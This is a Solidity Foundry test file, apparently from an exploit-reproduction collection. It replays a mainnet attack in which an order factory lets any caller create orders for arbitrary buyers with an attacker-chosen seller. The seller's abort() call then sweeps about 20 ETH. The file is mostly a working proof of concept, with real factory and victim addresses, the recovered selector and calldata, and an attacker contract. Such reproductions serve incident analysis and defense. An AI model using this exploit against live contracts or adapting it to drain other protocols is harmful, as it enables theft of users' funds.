// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// Order-factory exploit — Ethereum. The factory's order-creation entrypoint (selector 0xbde886fc)
// lets ANY caller create an order "for" an arbitrary buyer: it only checks that the buyer's request is
// active (getState(buyer) == 1). It never checks msg.sender == buyer, takes no buyer signature/nonce,
// and does not validate the attacker-supplied `seller`. The factory then pulls the buyer's FULL ETH
// balance out of the Account System into a freshly created order proxy and writes the attacker-chosen
// `seller` into the order's privileged slot. The attacker (as that seller) then calls the order's
// abort(address) to sweep all of that ETH to itself. One transaction drains many buyers.
//
// Attack tx : 0x201c7a9b4114c76fcda2b5de5d765505f4c5f7c194dddf505043501de6cbbb1a (block 25933639)
// Attacker  : 0x77071d2bbd8f3c296c8cd7d0abd21bc172420cda (via helper contract 0xde26cf7c...)
// Factory   : 0xa27bcd590195b2a9bdc29379de4f040b2d8066e0 (Order Factory, unverified)
// Account   : 0xfcf3d97c6db4c3bf6020a2b99af074b595bda163 (Account System, unverified, holds buyer ETH)
// Deployer  : 0xdd3068d772764443e4c4b18b8c96aee153d83056 (creates each order proxy via CREATE)
// Loss      : ~24.7 ETH reported for the incident. This attack tx drained 5 buyers for 20.247 ETH
//             (10.05 + 5.05 + 3.05 + 1.547 + 0.55); the PoC reproduces exactly this tx and asserts
//             against 20.247 ETH. Matching the full ~24.7 ETH (other txs/buyers) is unnecessary.
//
// ROOT CAUSE — confirmed on-chain (all three contracts are unverified, so confirmed by the tx trace,
// direct reads, and 4-byte-matched signatures rather than by source):
//   1. getState(address)=0x1bab58f5 returns 1 (active) for each targeted buyer, and that is the ONLY
//      gate. createOrderForBuyer (0xbde886fc) is reachable by any address; in the real tx the attacker's
//      helper — not the buyer, and holding no buyer authorization — makes every call.
//   2. The buyer's whole balance (accountBalances(buyer)=0x6ff96d17) is moved by the Account System into
//      the new order proxy: 10.05 / 5.05 / 3.05 / 1.547 / 0.55 ETH for the five buyers, exactly their
//      account balances.
//   3. During order init the factory writes the attacker-supplied `seller` into the order's privileged
//      slot; the order's abort(address)=0x90cbfa19 authorizes against that slot, so the attacker (the
//      seller) passes the check and abort() forwards the order's full ETH to the address it names.
//
// ABI note: the factory is unverified so createOrderForBuyer's function NAME is unknown; the 9-argument
// tuple below was recovered from the trace and re-encoded byte-for-byte against the real calldata, and
// is invoked under the confirmed selector 0xbde886fc with real typed values (no calldata blob).
// abort / getState / accountBalances are real names (their selectors match keccak of the name).
//
// Run:
//   forge test --contracts src/test/2026-09/OrderFactory_exp.sol -vvv

address constant FACTORY = 0xa27BCD590195b2A9BDc29379De4F040b2D8066e0;
address constant ACCOUNT = 0xFcF3d97c6Db4C3bF6020a2b99af074B595bDA163;
address constant DEPLOYER = 0xDd3068d772764443E4c4B18B8c96AeE153D83056; // CREATEs each order proxy
bytes4 constant CREATE_ORDER_SELECTOR = 0xbde886fc; // permissionless createOrderForBuyer entry

interface IOrderFactory {
    function getState(address buyer) external view returns (uint256);
}

interface IAccountSystem {
    function accountBalances(address account) external view returns (uint256);
}

interface IOrder {
    // Sends the order proxy's full ETH balance to `to`. Authorizes against the privileged slot that
    // createOrderForBuyer set to the attacker-supplied seller.
    function abort(address to) external;
}

contract OrderFactory_exp is Test {
    // The five buyers drained in the real tx, in order.
    address[5] internal BUYERS = [
        0x448F48d9149c3Eb7154019Efefa6A7Bf2BD58753,
        0x8F7dB8128FAE33915d47709074E2391e37A71136,
        0x5C8D3b20f52993C7f553Dd2bBf5d062b7CfC17D1,
        0x9D8f6E98d6ebe13B424386677BCF4b80dB0c6729,
        0x3eD7571B72ffBF0d44b741b49b597791b70e145D
    ];

    // Each buyer's order amount (createOrderForBuyer arg params[0]); the factory checks it against the
    // buyer's own stored request, so it must match per buyer. Every other order-config arg is identical
    // across buyers. Values taken verbatim from the real tx.
    uint256[5] internal ORDER_AMOUNT =
        [uint256(0x29a2241af62c0000), 0x4563918244f40000, 0x29a2241af62c0000, 0x2386f26fc10000, 0x6f05b59d3b20000];

    OrderFactoryExploit internal exploit;

    function setUp() public {
        // Parent block of the exploit tx: real protocol/buyer state immediately before the attack.
        vm.createSelectFork("mainnet", 25_933_638);
        exploit = new OrderFactoryExploit();

        vm.label(FACTORY, "OrderFactory");
        vm.label(ACCOUNT, "AccountSystem");
        vm.label(DEPLOYER, "OrderDeployer");
        vm.label(address(exploit), "Exploit");
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        // CONFIRM the only gate is the buyer's active state, reachable permissionlessly.
        for (uint256 i = 0; i < BUYERS.length; i++) {
            assertEq(IOrderFactory(FACTORY).getState(BUYERS[i]), 1, "buyer must be active (the only check)");
        }

        uint256 attackerBefore = address(exploit).balance;
        uint256 expected;

        for (uint256 i = 0; i < BUYERS.length; i++) {
            address buyer = BUYERS[i];
            uint256 buyerFunds = IAccountSystem(ACCOUNT).accountBalances(buyer);
            expected += buyerFunds;

            // The order proxy is created by DEPLOYER via CREATE; predict its address from the deployer's
            // current nonce (exactly what an attacker does off-chain), then hand it to the exploit.
            address order = vm.computeCreateAddress(DEPLOYER, vm.getNonce(DEPLOYER));

            exploit.createForBuyer(buyer, ORDER_AMOUNT[i]); // permissionless create for an arbitrary buyer
            exploit.doAbort(order); // sweep the buyer's ETH out of the order via the seller-gated abort()

            emit log_named_decimal_uint("drained from buyer", buyerFunds, 18);
        }

        uint256 profit = address(exploit).balance - attackerBefore;
        emit log_named_decimal_uint("total ETH drained", profit, 18);

        // Profit is ETH swept out of the buyers' accounts into the attacker. Assert against this tx's
        // total (20.247 ETH); the reported ~24.7 ETH spans the whole incident (other txs/buyers).
        assertEq(profit, expected, "attacker must capture every targeted buyer's full balance");
        assertGt(profit, 20 ether, "this tx drains ~20.25 ETH");
    }
}

// Named attacker contract: the malicious "seller". Calls the factory's real order-creation entry for an
// arbitrary buyer with itself as seller, then aborts the created order to sweep the buyer's ETH.
contract OrderFactoryExploit {
    // Fixed order-config arguments carried by createOrderForBuyer, taken verbatim from the real tx. The
    // factory validates the order args against the buyer's stored request, so `orderAmount` (params[0])
    // is passed per buyer; the rest are identical across buyers. The ETH pulled is always the buyer's
    // whole account balance, independent of these values.
    address internal constant P2 = 0x3a5d6df61eC0A90E2cAd7af1FE3311cF1B8dc4da;

    function doAbort(address order) external {
        IOrder(order).abort(address(this));
    }

    function createForBuyer(address buyer, uint256 orderAmount) external {
        bytes32[] memory symbols = new bytes32[](5);
        symbols[0] = "BTC";
        symbols[1] = "ETH";
        symbols[2] = "XRP";
        symbols[3] = "BCH";
        symbols[4] = "XEM";

        uint256[] memory prices = new uint256[](5);
        prices[0] = 0x4a4aaf61436c;
        prices[1] = 0x071afd498d0000;
        prices[2] = 0x1769f313804ed6a0;
        prices[3] = 0x03b81432872c72;
        prices[4] = 0x4b91f9f55a59d220;

        uint256[] memory params = new uint256[](10);
        params[0] = orderAmount;
        params[1] = 0xb1a2bc2ec50000;
        params[2] = 0;
        params[3] = 0;
        params[4] = 0x7d0;
        params[5] = 0x038d7ea4c68000;
        params[6] = 0x278d00;
        params[7] = 0xe10;
        params[8] = 0x15180;
        params[9] = 0x186a0;

        // createOrderForBuyer(buyer, seller=this, P2, 0, this, symbols, prices, params, 0). Permissionless
        // — only the buyer's active state is checked. Pulls the buyer's whole balance into `order` and
        // writes this contract (the seller) into the order's privileged slot.
        (bool ok,) = FACTORY.call(
            abi.encodeWithSelector(
                CREATE_ORDER_SELECTOR, buyer, address(this), P2, uint256(0), address(this), symbols, prices, params, uint256(0)
            )
        );
        require(ok, "createOrderForBuyer failed");
    }

    receive() external payable {}
}
